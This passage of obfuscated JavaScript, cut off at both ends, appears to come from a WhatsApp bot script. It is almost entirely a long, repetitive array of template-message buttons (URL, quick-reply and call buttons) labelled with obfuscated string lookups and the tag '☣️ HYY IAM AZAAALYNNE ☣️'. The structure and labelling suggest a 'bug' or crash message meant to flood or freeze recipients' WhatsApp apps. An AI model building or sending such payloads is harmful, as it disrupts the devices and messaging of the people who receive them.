urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNEAZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNEAZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9